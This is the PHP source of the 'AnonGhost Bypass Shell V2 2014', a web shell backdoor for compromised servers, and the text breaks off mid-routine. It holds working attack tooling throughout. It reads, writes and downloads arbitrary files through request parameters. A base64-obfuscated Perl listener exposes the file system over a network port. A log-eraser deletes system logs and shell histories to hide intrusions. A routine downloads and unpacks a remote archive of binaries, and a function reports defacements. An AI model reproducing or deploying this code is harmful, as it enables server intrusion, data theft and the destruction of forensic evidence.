<?php
session_start();

error_reporting(E_ERROR | E_PARSE);
@ini_set("max_execution_time",0);
@set_time_limit(0); #No Fx in SafeMode
@ignore_user_abort(TRUE);
@set_magic_quotes_runtime(0);

// global configs

$username="AnonGhost";
$password = "AnonGhost"; // shell password, change it, max 50 chars
$warn="<center><img src='http://mfs1.cdnsw.com/fs/Nouveau_dossier/6qyet-alarme.gif'   height='150px' width='150px'/></center><br>
<audio autoplay loop > <source src=\"http://soundbible.com/mp3/Red%20Alert-SoundBible.com-108009997.mp3\" type=\"audio/mpeg\"></audio>";
$about = "<style type=\"text/css\">body { background-color:#222222; color: rgb(0, 119, 0); text-align: center } a{text-decoration:none; font-family: Tahoma, Geneva; color:#007700; padding:2px 2px;}
      a:hover{color:#009900; text-shadow:#00ff00 0px 0px 3px;} 
.cont a{ text-decoration: none; color:rgb(0, 153, 0); font-family: Tahoma, Arial, sans-serif  ; font-size: 16px; text-shadow: 0px 0px 3px ; } .cont a:hover{ color: #FF0000 ; text-shadow:0px 0px 3px #ff0000 ;} 
div.logindiv { background-color:#353535; width:30%; border-radius:7px; margin-top:2px; -moz-border-radius:25px; height:55px; border: solid 1px #828282; border-radius: 5px; box-shadow: 0px 0px 10px #000000; }
div.logindiv:hover { background-color:#e4e4e4; width:30%; border-radius:7px; margin-top:2px; -moz-border-radius:25px; height:55px; border: solid 1px #007700; border-radius: 5px; box-shadow: 0px 0px 8px #00bb00; }</style>
<center><span style='font-size:25px; font-family:Fredericka the Great; color:#009900'>
AnonGhost Bypass Shell V2 2014</span><br><br><font color=\"#007700\" size=\"1pt\">Coded by </font><font  color=\"#00bb00\" size=\"1pt\">Virusa Worm</font> <font color=\"#007700\" size=\"1pt\">-</font> <font color=\"#00bb00\" size=\"1pt\">Mauritania Attacker</font> | <font color=\"#007700\" size=\"1pt\">Special thankz to : </font><font color=\"#00bb00\"  size=\"1pt\">AnonGhost Team</font><br><center><div class=\"logindiv\"><table cellpadding=\"7\" cellspacing=\"2\">
<br><center><iframe src='https://www.facebook.com/plugins/like.php?href=https://www.facebook.com/AnonGhostOfficial2&amp;send=false&amp;layout=standard&amp;width=400&amp;show_faces=false&amp;action=like&amp;colorscheme=light&amp;font=arial&amp;height=35' scrolling='no' frameborder='0' style='border:none; overflow:hidden; width:350px; height:20px;' allowTransparency='true'></iframe></center></table></div></center><br><font color=\"#009900\" size=\"1pt\">Greetz to : </font><br><font color=\"#00bb00\" size=\"1pt\">
AnonGhost - Teamp0ison - ZHC - Mauritania HaCker Team - 3xp1r3 Cyber Army - TeaMp0isoN - Robot Pirates - X-Blackerz INC. - Pak Cyber Pyrates - iMHATiMi.ORG - Afghan Cyber Army (ACA) - <font color=\"#007700\" size=\"1pt\">[ </font>Tanpa Bicara - Maniak k4Sur </font><font color=\"#007700\" size=\"1pt\">[pasangan galo.. lol..]]</font><br></center><br>";
$ben = "<style type=\"text/css\">body { background-color:#222222; color: rgb(0, 119, 0); text-align: center }  
    </style>
<center><img src=\"http://www4.0zz0.com/2014/08/22/21/544545766.jpg\" /><br><br><center>
<span style=\"font-size:30px; font-family:Fredericka the Great; color:#009900\">AnonGhost Bypass Shell V2 2014</span><br><font color=\"#008800\" size=\"1pt\">Coded by </font><font  color=\"#00bb00\" size=\"1pt\">Virusa Worm</font> <font color=\"#006600\" size=\"1pt\">-</font> <font color=\"#00bb00\" size=\"1pt\">Mauritania Attacker</font><br><br><center><img src=\"http://www7.0zz0.com/2014/08/22/20/260354169.png\"></center><br><span style=\"font-size:40px; font-family:Fredericka the Great; color:#ff0000\">You Have Been BANNED using this Shell</span><br><br><br><font color=\"#007700\" size=\"1pt\">AnonGhost Bypass Shell V2 2014 is created for Educational Purpose and testing on your own server, and not responsible for any misuse of it.</font> <br><br><font color=\"#009900\" size=\"1pt\">At first a Web Hacker was someone who would spend long hours trying to find bugs and exploit manually.</font><br><font color=\"#009900\" size=\"1pt\">The term has now changed known as a Defacer nowadays.<br>Tools does not Made Hackers , Hackers make Tools.<br>Do not Learn To Hack , Hack to Learn.wkkwk..<br><br><font color=\"#00ff00\" size=\"1pt\">\"</font>Keep Calm and enjoy Hacking \!/<font color=\"#00ff00\" size=\"1pt\">\"</font><br><br><br><font color=\"#007700\" size=\"1pt\">Special thankz to : </font><font color=\"#00bb00\" size=\"1pt\">AnonGhost Team</font><br><br>
<center><div class=\"logindiv\"><table cellpadding=\"7\" cellspacing=\"2\">
<center><br><iframe src=\"https://www.facebook.com/plugins/like.php?href=https://www.facebook.com/AnonGhostOfficial2&amp;send=false&amp;layout=standard&amp;width=400&amp;show_faces=false&amp;action=like&amp;colorscheme=light&amp;font=arial&amp;height=35\" scrolling=\"no\" frameborder=\"0\" style=\"border:none; overflow:hidden; width:350px; height:20px;\" allowTransparency=\"true\"></iframe></center></table></div></center><br>
<font color=\"#009900\" size=\"1pt\">Greetz to : </font><br><font color=\"#00bb00\" size=\"1pt\">
AnonGhost - Teamp0ison - ZHC - Mauritania HaCker Team - 3xp1r3 Cyber Army - TeaMp0isoN - Robot Pirates - X-Blackerz INC. - Pak Cyber Pyrates - iMHATiMi.ORG - Afghan Cyber Army (ACA) - <font color=\"#007700\" size=\"1pt\">[ </font>Tanpa Bicara - Maniak k4Sur </font><font color=\"#007700\" size=\"1pt\">[pasangan galo.. lol..]]</font><br></font></center>
</body>
</html>";
		
$symlink = stripslashes(base64_decode("IyEvdXNyL2Jpbi9lbnYgcGVybA0KIyBkZXZpbHpjMGRlLm9yZyAoYykgMjAxMg0KDQp1c2UgU29ja2V0Ow0KDQokcG9ydCA9IDEzMTIzOw0KDQokcHJvdG9jb2w9Z2V0cHJvdG9ieW5hbWUoXCd0Y3BcJyk7DQpzb2NrZXQoUywmUEZfSU5FVCwmU09DS19TVFJFQU0sJHByb3RvY29sKSB8fCBkaWU7DQpzZXRzb2Nrb3B0KFMsU09MX1NPQ0tFVCxTT19SRVVTRUFERFIsMSk7DQpiaW5kIChTLHNvY2thZGRyX2luKCRwb3J0LElOQUREUl9BTlkpKSB8fCBkaWU7DQpsaXN0ZW4gKFMsMykgfHwgZGllOw0Kd2hpbGUoMSl7DQoJYWNjZXB0IChDT05OLFMpOw0KCSRyZXE9PENPTk4+OyBjaG9tcCgkcmVxKTsgJHJlcT1+cy9cXHIvL2c7DQoJJHJlcSA9fiBzL1xcJShbQS1GYS1mMC05XXsyfSkvcGFjayhcJ0NcJywgaGV4KCQxKSkvc2VnOw0KCQ0KCXByaW50ICRyZXEuXCJcXHJcXG5cIjsNCgkNCgkkaGVhZGVycyA9IFwiSFRUUC8xLjEgMjAwIE9LXFxyXFxuXCI7DQoJJGhlYWRlcnMgLj0gXCJTZXJ2ZXI6IFBlcmxcXHJcXG5cIjsNCgkNCgkkdGFyZ2V0ID0gJHJlcTsNCglpZigkcmVxID1+IC9HRVQgLiogSFRUUC4qLyl7DQoJCSR0YXJnZXQgPX4gcy9HRVRcXCAvLzsNCgkJJHRhcmdldCA9fiBzL1xcIEhUVFAuKi8vOw0KCQkkcmVzcCA9IFwiXCI7DQoJCWlmKC1kICR0YXJnZXQpew0KCQkJaWYoISgkdGFyZ2V0ID1+IC8uKlxcLyskLykpew0KCQkJCSR0YXJnZXQgPSAkdGFyZ2V0LlwiL1wiOw0KCQkJfQ0KCQkJDQoJCQkkcmVzcCA9IFwiPCFET0NUWVBFIGh0bWwgUFVCTElDIFxcXCItLy9XM0MvL0RURCBIVE1MIDMuMiBGaW5hbC8vRU5cXFwiPg0KCQkJCQk8aHRtbD4NCgkJCQkJPHRpdGxlPkRpcmVjdG9yeSBsaXN0aW5nIGZvciBcIi4kdGFyZ2V0LlwiPC90aXRsZT4NCgkJCQkJPGJvZHk+DQoJCQkJCTxoMj5EaXJlY3RvcnkgbGlzdGluZyBmb3IgXCIuJHRhcmdldC5cIjwvaDI+DQoJCQkJCTxocj48dWw+XCI7DQoJCQkJCQ0KCQkJaWYob3BlbmRpcihESVIsJHRhcmdldCkpew0KCQkJCXdoaWxlKCRmaWxlID0gcmVhZGRpcihESVIpKXsNCgkJCQkJaWYoLWQgJHRhcmdldC4kZmlsZSl7DQoJCQkJCQlpZigoJGZpbGUgZXEgXCIuXCIpIHx8ICgkZmlsZSBlcSBcIi4uXCIpKXsgbmV4dDsgfQ0KCQkJCQkJJHJlc3AgLj0gXCI8bGk+PGEgaHJlZj1cXFwiXCIuJHRhcmdldC4kZmlsZS5cIi9cXFwiPlwiLiRmaWxlLlwiLzwvYT48L2xpPlxcclxcblwiOw0KCQkJCQl9DQoJCQkJCWVsc2lmKC1mICR0YXJnZXQuJGZpbGUpew0KCQkJCQkJJHJlc3AgLj0gXCI8bGk+PGEgaHJlZj1cXFwiXCIuJHRhcmdldC4kZmlsZS5cIlxcXCI+XCIuJGZpbGUuXCI8L2E+PC9saT5cXHJcXG5cIjsNCgkJCQkJfQ0KCQkJCX0NCgkJCQljbG9zZWRpcihESVIpOw0KCQkJfQ0KDQoJCQkkcmVzcCAuPSBcIjwvdWw+PGhyPg0KCQkJCQk8L2JvZHk+DQoJCQkJCTwvaHRtbD5cIjsNCgkJCQkJDQoJCQkkY29ubGVuID0gbGVuZ3RoKCRyZXNwKTsNCgkJCSRjb250eXBlID0gXCJ0ZXh0L2h0bWxcIjsNCgkJCXByaW50IFwiRGlyIDogXCIuJHRhcmdldC5cIlxcclxcblwiOw0KCQl9DQoJCWVsc2lmKC1mICR0YXJnZXQpew0KCQkJJGNvbmxlbiA9IC1zICR0YXJnZXQ7DQoJCQkkY29udHlwZSA9IFwidGV4dC9wbGFpblwiOw0KCQkJcHJpbnQgXCJGaWxlIDogXCIuJHRhcmdldC5cIiAoXCIuJGNvbmxlbi5cIilcXHJcXG5cIjsNCgkJfQ0KDQoJCXByaW50IFwiY29udHlwZSA6IFwiLiRjb250eXBlLlwiXFxyXFxuXCI7DQoJCXByaW50IFwiY29ubGVuIDogXCIuJGNvbmxlbi5cIlxcclxcblwiOw0KCQkNCgkJJGhlYWRlcnMgLj0gXCJDb250ZW50LVR5cGU6IFwiLiRjb250eXBlLlwiXFxyXFxuXCI7DQoJCSRoZWFkZXJzIC49IFwiQ29udGVudC1MZW5ndGg6IFwiLiRjb25sZW4uXCJcXHJcXG5cIjsNCgkNCgkJcHJpbnQgQ09OTiAkaGVhZGVycy5cIlxcclxcblwiOw0KCQkNCgkJaWYoLWQgJHRhcmdldCl7DQoJCQlwcmludCBDT05OICRyZXNwOw0KCQl9DQoJCWVsc2lmKC1mICR0YXJnZXQpew0KCQkJaWYob3BlbihGSUxFLCR0YXJnZXQpKXsNCgkJCQliaW5tb2RlIEZJTEU7DQoJCQkJd2hpbGUgKCgkbiA9IHJlYWQgRklMRSwgJGRhdGEsIDEwMjQpICE9IDApIHsgDQoJCQkJCXByaW50IENPTk4gJGRhdGE7DQoJCQkJfSANCgkJCQljbG9zZShGSUxFKTsgDQoJCQl9DQoJCX0NCgl9DQoJY2xvc2UgQ09OTjsNCn0NCmV4aXQgMDs="));

function Zip($source, $destination)
{
    if (!extension_loaded('zip') || !file_exists($source)) {
        return false;
    }

    $zip = new ZipArchive();
    if (!$zip->open($destination, ZIPARCHIVE::CREATE)) {
        return false;
    }

    $source = str_replace('\\', '/', realpath($source));

    if (is_dir($source) === true)
    {
        $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($source), RecursiveIteratorIterator::SELF_FIRST);

        foreach ($files as $file)
        {
            $file = str_replace('\\', '/', realpath($file));

            if (is_dir($file) === true)
            {
                $zip->addEmptyDir(str_replace($source . '/', '', $file . '/'));
            }
            else if (is_file($file) === true)
            {
                $zip->addFromString(str_replace($source . '/', '', $file), file_get_contents($file));
            }
        }
    }
    else if (is_file($source) === true)
    {
        $zip->addFromString(basename($source), file_get_contents($source));
    }

    return $zip->close();
}

function getperms ($file) {        
    $perm = substr(sprintf('%o', fileperms($file)), -4);
    return $perm;
}

if(isset($_GET['zip'])) {
    $src = $_GET['zip'];
    $dst = getcwd()."/".basename($_GET['zip']).".zip";
    if (Zip($src, $dst) != false) {
        $filez = file_get_contents($dst);
        header("Content-type: application/octet-stream");
        header("Content-length: ".strlen($filez));
        header("Content-disposition: attachment; filename=\"".basename($dst)."\";");
        echo $filez;
    }
    exit;
}

function showDrives()
    {
        global $self;
        foreach(range('A','Z') as $drive)
        {
            if(is_dir($drive.':\\'))
            {
                ?><?php echo $self ?><?php echo $drive.":\\"; ?><?php echo $drive.":\\" ?><?php
            }
        }
    }


function HumanReadableFilesize($size)
    {
 
        $mod = 1024;
 
        $units = explode(' ','B KB MB GB TB PB');
        for ($i = 0; $size > $mod; $i++) 
        {
            $size /= $mod;
        }
 
        return round($size, 2) . ' ' . $units[$i];
    }
function getFilePermissions($file)
{
    
$perms = fileperms($file);

if (($perms & 0xC000) == 0xC000) {
    // Socket
    $info = 's';
} elseif (($perms & 0xA000) == 0xA000) {
    // Symbolic Link
    $info = 'l';
} elseif (($perms & 0x8000) == 0x8000) {
    // Regular
    $info = '-';
} elseif (($perms & 0x6000) == 0x6000) {
    // Block special
    $info = 'b';
} elseif (($perms & 0x4000) == 0x4000) {
    // Directory
    $info = 'd';
} elseif (($perms & 0x2000) == 0x2000) {
    // Character special
    $info = 'c';
} elseif (($perms & 0x1000) == 0x1000) {
    // FIFO pipe
    $info = 'p';
} else {
    // Unknown
    $info = 'u';
}

// Owner
$info .= (($perms & 0x0100) ? 'r' : '-');
$info .= (($perms & 0x0080) ? 'w' : '-');
$info .= (($perms & 0x0040) ?
            (($perms & 0x0800) ? 's' : 'x' ) :
            (($perms & 0x0800) ? 'S' : '-'));

// Group
$info .= (($perms & 0x0020) ? 'r' : '-');
$info .= (($perms & 0x0010) ? 'w' : '-');
$info .= (($perms & 0x0008) ?
            (($perms & 0x0400) ? 's' : 'x' ) :
            (($perms & 0x0400) ? 'S' : '-'));

// World
$info .= (($perms & 0x0004) ? 'r' : '-');
$info .= (($perms & 0x0002) ? 'w' : '-');
$info .= (($perms & 0x0001) ?
            (($perms & 0x0200) ? 't' : 'x' ) :
            (($perms & 0x0200) ? 'T' : '-'));

return $info;

}
function dirSize($directory) {
    $size = 0;
    foreach(new RecursiveIteratorIterator(new RecursiveDirectoryIterator($directory)) as $file){
        try {       
            $size += $file->getSize();
        }
        catch (Exception $e){    // Symlinks and other shits
            $size += 0;
        }
    }
    return $size;
}


function ZoneH($url, $hacker, $hackmode,$reson, $site )
{
	$k = curl_init();
	curl_setopt($k, CURLOPT_URL, $url);
	curl_setopt($k,CURLOPT_POST,true);
	curl_setopt($k, CURLOPT_POSTFIELDS,"defacer=".$hacker."&domain1=". $site."&hackmode=".$hackmode."&reason=".$reson);
	curl_setopt($k,CURLOPT_FOLLOWLOCATION, true);
	curl_setopt($k, CURLOPT_RETURNTRANSFER, true);
	$kubra = curl_exec($k);
	curl_close($k);return $kubra;
}

?><?php


if(isset($_SESSION['loggedin']) && !empty($_SESSION['loggedin'])){
// welcome user
echo '<center>'.base64_decode("PGltZyBzcmM9Imh0dHA6Ly93d3c0LjB6ejAuY29tLzIwMTQvMDgvMjIvMjEvNTQ0NTQ1NzY2LmpwZyIgLz4=").'</center>' ;
echo '<center><font color="#007700" face="Tahoma, Geneva, sans-serif" style="font-size: 8pt">';
echo '<div id="deti"><font color="#009900" style="font-size: 7pt">Kernel Version : </font><font color="#00bb00" style="font-size: 7pt">';echo php_uname();
echo '</font>';

echo '<br><font color="#009900" style="font-size: 7pt">PHP Version:</font> <font color="00bb00" style="font-size: 7pt">';echo phpversion();

echo '</font><font color="#00dd00"> |</font> <font color="#009900" style="font-size: 7pt">Current User :</font> <font color="00bb00" style="font-size: 7pt">';echo get_current_user();

echo '</font><font color="#00dd00"> |</font> <font color="#009900" style="font-size: 7pt">User ID :</font> <font color="00bb00" style="font-size: 7pt">';echo getmyuid();

echo '</font><font color="#00dd00"> |</font> <font color="#009900" style="font-size: 7pt">Group :</font> <font color="00bb00" style="font-size: 7pt">';echo getmygid();

echo '</font><font color="#00dd00"> |</font> <font color="#009900" style="font-size: 7pt">Cwd :</font> <font color="00bb00" style="font-size: 7pt">';echo getcwd();
echo '</font></b></div><br></center>';

?><?php echo htmlentities($_SERVER['PHP_SELF']); ?><?php
if(ini_get('safe_mode') == '1'){
echo '<font color="#007700"> Safe mode:</font><b class="tul"><font color="red"> ON&nbsp;</font></font></b>-';
}
else{
echo '<font color="#007700"> Safe mode:</font><b class="tul"><font color="ff0000"> OFF&nbsp;</font></b>-';
}
if(ini_get('magic_quotes_gpc') == '1'){
echo '<font color="#007700"> Magic_quotes_gpc:</font><b class="tul"><font color="red"> ON&nbsp;</font></b>-';
}
else{
echo '<font color="#007700"> Magic_quotes_gpc:</font><b class="tul"><font color="ff0000"> OFF&nbsp;</font></b>-';
}
if(function_exists('mysql_connect')){
echo '<font color="#007700"> Mysql:</font><b class="tul"><font color="ff0000"> ON&nbsp;</font></b>-';
}
else{
echo '<font color="#007700"> Mysql:</font><b class="tul"><font color="red"> OFF&nbsp;</font></b>-';
}
if(function_exists('mssql_connect')){
echo '<font color="#007700"> Mssql:</font><b class="tul"><font color="ff0000"> ON&nbsp;</font></b>-';
}
else{
echo '<font color="#007700"> Mssql:</font><b class="tul"><font color="ffff00"> OFF&nbsp;</font></b>-';
}
if(function_exists('pg_connect')){
echo '<font color="#007700"> PostgreSQL:</font><b class="tul"><font color="ff0000"> ON&nbsp;</font></b>-';
}
else{
echo '<font color="#007700"> PostgreSQL:</font><b class="tul"><font color="ffff00"> OFF&nbsp;</font></b>-';
}
if(function_exists('ocilogon')){
echo '<font color="#007700"> Oracle:</font><b class="tul"><font color="ff0000"> ON&nbsp;</font></b>-';
}
else{
echo '<font color="#007700"> Oracle:</font><b class="tul"><font color="ffff00"> OFF&nbsp;</font></b>-';
}
if(function_exists('curl_version')){
echo '<font color="#007700"> Curl:</font><b class="tul"><font color="ff0000"> ON&nbsp;</font></b>-';
}
else{
echo '<font color="#007700"> Curl:</font><b class="tul"><font color="red"> OFF&nbsp;</font></b>-';
}
if(function_exists('exec')){
echo '<font color="#007700"> Exec:</font><b class="tul"><font color="ff0000"> ON&nbsp;</font></b>-';
}
else{
echo '<font color="#007700"> Exec:</font><b class="tul"><font color="red"> OFF&nbsp;</font></b>-';
}
if(!ini_get('open_basedir') != "on"){
echo '<font color="#007700"> Open_basedir:</font><b class="tul"><font color="red"> OFF&nbsp;</font></b>-';
}
else{
echo '<font color="#007700"> Open_basedir:</font><b class="tul"><font color="ff0000"> ON&nbsp;</font></b>-';
}
if(!ini_get('ini_restore') != "on"){
echo '<font color="#007700"> Ini_restore:</font><b class="tul"><font color="red"> OFF&nbsp;</font></b>-';
}
else{
echo '<font color="#007700"> Ini_restore:</font><b class="tul"><font color="ff0000"> ON&nbsp;</font></b>-';
}
if(function_exists('symlink')){
echo '<font color="#007700"> Symlink:</font><b class="tul"><font color="ff0000"> ON&nbsp;</font></b>-';
}
else{
echo '<font color="#007700"> Symlink:</font><b class="tul"><font color="red"> OFF&nbsp;</font></b>-';
}
if(function_exists('file_get_contents')){
echo '<font color="#007700"> file_get_contents:</font><b class="tul"><font color="ff0000"> ON&nbsp;</font></b>-';
}
else{
echo '<font color="#007700"> file_get_contents:</font><b class="tul"><font color="red"> OFF&nbsp;</font></b>-';
}
if(is_dir('sim/rut')){
echo '<font color="#007700"> Permission:</font><b class="tul"><font color="ff0000"> ON&nbsp;</font></b>-';
}
else{
echo '<font color="#007700"> Permission:</font><b class="tul"><font color="red"> OFF&nbsp;</font></b>';
}
?><?php
#################################################################
//code for php.ini

if(isset($_POST['source']) && isset($_POST['file'])){
$source = $_POST['source'];
$file = $_POST['file'];
$fp = fopen($file, 'w');
fwrite($fp, $source);
fclose($fp);
echo '<center><font color="#b0b000"><b>File saved</b></font></center>';
}
if(isset($_GET['turnoff'])){
if(is_writable(".htaccess")){
$value = $_GET['turnoff'];
if(file_exists(".htaccess")){
// fread example
$handle = fopen(".htaccess", "r");
$contents = '';
while (!feof($handle)) {
$read = fread($handle, 8192);
$contents = $contents.$read;


?><?php

if($value == 'magic_quotes_gpc'){
$data = 'php_value magic_quotes_gpc off
'.$contents;
echo $data;
}
else{
echo $contents;
}
	?><?php
}
fclose($handle);
}
}
if(!file_exists(".htaccess")){
// make htaccess file
$myfile = '.htaccess';
$handle = fopen($myfile, 'w') or die('Cannot open file:  '.$myfile);
fclose($handle);
echo '<br><center><font color="#b0b000"><b>File created</b></font> <b><a href="?turnoff=ini">click here</a></b></center>';
}
?><?php 
}

// make file
if(isset($_GET['make'])){
// file maker
if(!file_exists($_GET['make'])){
// make htaccess file
$myfile = $_GET['make'];
$handle = fopen($myfile, 'w') or die('Cannot open file:  '.$myfile);
fclose($handle);
echo '<center><font color="#b0b000"><b>File created</b></font> <a href="?view='.$myfile.'&dir=0">click here</a></center>';
}
else{
echo '<center><font color="red">This file exist.</font>&nbsp;&nbsp;&nbsp;&nbsp; <a href="?delete='.$_GET['make'].'">delete</a>&nbsp;&nbsp;&nbsp;&nbsp; <a href="?view='.$_GET['make'].'">open</a><center>';
}
}

if(isset($_GET['get'])){
// download
$file = $_GET['get'];
if (file_exists($file)) {
    header('Content-Description: File Transfer');
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename='.basename($file));
    header('Content-Transfer-Encoding: binary');
    header('Expires: 0');
    header('Cache-Control: must-revalidate');
    header('Pragma: public');
    header('Content-Length: ' . filesize($file));
    ob_clean();
    flush();
    readfile($file);
	exit();
}
}

if(isset($_GET['view'])){
$file = $_GET['view'];
?><?php
if(file_exists($file)){
$open = htmlspecialchars(file_get_contents($file));
if($open){
echo $open;
}
}
else{
echo '				FILE DOES NOT EXISTS';
}
?><?php echo $file; ?><?php echo $file; ?><?php echo $file; ?><?php
}


if(isset($_GET['action']) && $_GET['action'] == 'simlinge'){
$a = fopen("vws.pl", "w");
fputs($a, $symlink);
fclose($a);
system("perl vws.pl");
}


if(isset($_GET['action']) && $_GET['action'] == 'deltlogss'){
echo '<br><center><span style="font-size:30px; font-family:Fredericka the Great; color:#009900">Logs Eraser</span><center><br>';
//exec function madafuck !
echo "<table style='margin: 0 auto;'><tr valign='top'><td align='left'>";      
exec("rm -rf /tmp/logs");
exec("rm -rf /root/.ksh_history");
exec("rm -rf /root/.bash_history");
exec("rm -rf /root/.bash_logout");
exec("rm -rf /usr/local/apache/logs");
exec("rm -rf /usr/local/apache/log");
exec("rm -rf /var/apache/logs");
exec("rm -rf /var/apache/log");
exec("rm -rf /var/run/utmp");
exec("rm -rf /var/logs");
exec("rm -rf /var/log");
exec("rm -rf /var/adm");
exec("rm -rf /etc/wtmp");
exec("rm -rf /etc/utmp");
exec("rm -rf $HISTFILE");
exec("rm -rf /var/log/lastlog");
exec("rm -rf /var/log/wtmp");

//shell_exec function madafuck !
shell_exec("rm -rf /tmp/logs");
shell_exec("rm -rf /root/.ksh_history");
shell_exec("rm -rf /root/.bash_history");
shell_exec("rm -rf /root/.bash_logout");
shell_exec("rm -rf /usr/local/apache/logs");
shell_exec("rm -rf /usr/local/apache/log");
shell_exec("rm -rf /var/apache/logs");
shell_exec("rm -rf /var/apache/log");
shell_exec("rm -rf /var/run/utmp");
shell_exec("rm -rf /var/logs");
shell_exec("rm -rf /var/log");
shell_exec("rm -rf /var/adm");
shell_exec("rm -rf /etc/wtmp");
shell_exec("rm -rf /etc/utmp");
shell_exec("rm -rf $HISTFILE");
shell_exec("rm -rf /var/log/lastlog");
shell_exec("rm -rf /var/log/wtmp");

//passthru function madafuck !
passthru("rm -rf /tmp/logs");
passthru("rm -rf /root/.ksh_history");
passthru("rm -rf /root/.bash_history");
passthru("rm -rf /root/.bash_logout");
passthru("rm -rf /usr/local/apache/logs");
passthru("rm -rf /usr/local/apache/log");
passthru("rm -rf /var/apache/logs");
passthru("rm -rf /var/apache/log");
passthru("rm -rf /var/run/utmp");
passthru("rm -rf /var/logs");
passthru("rm -rf /var/log");
passthru("rm -rf /var/adm");
passthru("rm -rf /etc/wtmp");
passthru("rm -rf /etc/utmp");
passthru("rm -rf $HISTFILE");
passthru("rm -rf /var/log/lastlog");
passthru("rm -rf /var/log/wtmp");


//Let the Mother of Functions To Complete The Task wkwkwkw xD!
system("rm -rf /tmp/logs");
sleep(2);
echo'<br><font color="009900" face="Tahoma, Geneva, sans-serif" style="font-size: 10pt">Deleted [+].../tmp/logs <img src=http://l.yimg.com/us.yimg.com/i/mesg/emoticons7/41.gif>';
sleep(2);

system("rm -rf /root/.bash_history");
sleep(2);
echo'<p>Deleted [+].../root/.bash_history <img src=http://l.yimg.com/us.yimg.com/i/mesg/emoticons7/41.gif></p>';

system("rm -rf /root/.ksh_history");
sleep(2);
echo'<p>Deleted [+].../root/.ksh_history <img src=http://l.yimg.com/us.yimg.com/i/mesg/emoticons7/41.gif></p>';

system("rm -rf /root/.bash_logout");
sleep(2);
echo'<p>Deleted [+].../root/.bash_logout <img src=http://l.yimg.com/us.yimg.com/i/mesg/emoticons7/41.gif></p>';

system("rm -rf /usr/local/apache/logs");
sleep(2);
echo'<p>Deleted [+].../usr/local/apache/logs <img src=http://l.yimg.com/us.yimg.com/i/mesg/emoticons7/41.gif></p>';

system("rm -rf /usr/local/apache/log");
sleep(2);
echo'<p>Deleted [+].../usr/local/apache/log <img src=http://l.yimg.com/us.yimg.com/i/mesg/emoticons7/41.gif></p>';

system("rm -rf /var/apache/logs");
sleep(2);
echo'<p>Deleted [+].../var/apache/logs <img src=http://l.yimg.com/us.yimg.com/i/mesg/emoticons7/41.gif></p>';

system("rm -rf /var/apache/log");
sleep(2);
echo'<p>Deleted [+].../var/apache/log <img src=http://l.yimg.com/us.yimg.com/i/mesg/emoticons7/41.gif></p>';

system("rm -rf /var/run/utmp");
sleep(2);
echo'<p>Deleted [+].../var/run/utmp <img src=http://l.yimg.com/us.yimg.com/i/mesg/emoticons7/41.gif></p>';

system("rm -rf /var/logs");
sleep(2);
echo'<p>Deleted [+].../var/logs <img src=http://l.yimg.com/us.yimg.com/i/mesg/emoticons7/41.gif></p>';

system("rm -rf /var/log");
sleep(2);
echo'<p>Deleted [+].../var/log <img src=http://l.yimg.com/us.yimg.com/i/mesg/emoticons7/41.gif></p>';

system("rm -rf /var/adm");
sleep(2);
echo'<p>Deleted [+].../var/adm <img src=http://l.yimg.com/us.yimg.com/i/mesg/emoticons7/41.gif></p>';

system("rm -rf /etc/wtmp");
sleep(2);
echo'<p>Deleted [+].../etc/wtmp <img src=http://l.yimg.com/us.yimg.com/i/mesg/emoticons7/41.gif></p>';

system("rm -rf /etc/utmp");
sleep(2);
echo'<p>Deleted [+].../etc/utmp <img src=http://l.yimg.com/us.yimg.com/i/mesg/emoticons7/41.gif></p>';

system("rm -rf $HISTFILE");
sleep(2);
echo'<p>Deleted [+]...$HISTFILE <img src=http://l.yimg.com/us.yimg.com/i/mesg/emoticons7/41.gif></p>'; 

system("rm -rf /var/log/lastlog");
sleep(2);
echo'<p>Deleted [+].../var/log/lastlog <img src=http://l.yimg.com/us.yimg.com/i/mesg/emoticons7/41.gif></p>';

system("rm -rf /var/log/wtmp");
sleep(2);
echo'<p>Deleted [+].../var/log/wtmp <img src=http://l.yimg.com/us.yimg.com/i/mesg/emoticons7/41.gif></p>';

sleep(4);

echo '</font><br><br><p><font color="00bb00" face="Tahoma, Geneva, sans-serif" style="font-size: 10pt">Your Traces Has Been Successfully Erased From the Server';
echo"</td></tr></table>";

}


if(isset($_GET['action']) && $_GET['action'] == 'exgz'){
echo '<center><b class="conte">
<a href="?action=exgz">Bypass Server Functions</a> -
<a href="?action=tespr">Test Permission</a> -
<a href="?action=srvrinformations">Server Informations</a>  </center>
</b>';
echo '<br><center><span style="font-size:30px; font-family:Fredericka the Great; color:#009900">Bypass Server Functions 100% Priv8</span><center>';
echo '<center><font color="#007700" face="Tahoma, Geneva, sans-serif" style="font-size: 10pt">Coded  By Mauritania Attacker</font><br><br><font color="#009900" face="Tahoma, Geneva, sans-serif" style="font-size: 12pt">Force Enabling Functions on the Server <font/></b><br><br>
<form method="post"><font color="#007700" face="Tahoma, Geneva, sans-serif" style="font-size: 10pt">Remote File Zip Functions</font> <input type="text" size="40" name="shell" value="http://hcp1.es/wp-content/uploads/ghost.zip"> <input type="submit" value="Bypass Functions Now" name="fuck"></center>
</form><br><br>
</center>';
@error_reporting(0);
/*
* Coded By : Mauritania Attacker
* Avalaibility : Priv99999999999 !
* This Tool is not for kids !!
* GreetZ To All AnonGhost MemberZ
*/

$file = $_POST['shell'];
//Generate zip file
$fopen = fopen("ghost.zip",'w');
$shell = @file_get_contents($file);
$swrite = fwrite($fopen ,$shell);
if($swrite){
echo "<table style='margin: 0 auto;'><tr valign='top'><td align='left'>"; 
echo "<font color='007700' face='Tahoma, Geneva, sans-serif' style='font-size: 10pt'>Zip Functions Uploaded Successfully\n</font><br>";
sleep(2);
echo "<p><font color='007700' face='Tahoma, Geneva, sans-serif' style='font-size: 10pt'>Going To Unzip All Functions Now Be patient Nygga ....</font></p><br>";

sleep(2); 

//system
system('unzip ghost.zip');

chmod("id" , 0777);
chmod("gunzip" , 0777);
chmod("pwd" , 0777);
chmod("ln" , 0777);
chmod("ls" , 0777);
chmod("chmod" , 0777);
chmod("uname" , 0777);
chmod("rm" , 0777);
chmod("su" , 0777);
chmod("tail" , 0777);
chmod("Ptouch" , 0777);
chmod("who" , 0777);
chmod("gcc" , 0777);
chmod("tar" , 0777);
chmod("du" , 0777);
chmod("dir" , 0777);
chmod("wget" , 0777);
chmod("date" , 0777);
chmod("gzip" , 0777);
chmod("sh" , 0777);

//passthru
passthru('unzip ghost.zip');

chmod("id" , 0777);
chmod("gunzip" , 0777);
chmod("pwd" , 0777);
chmod("ln" , 0777);
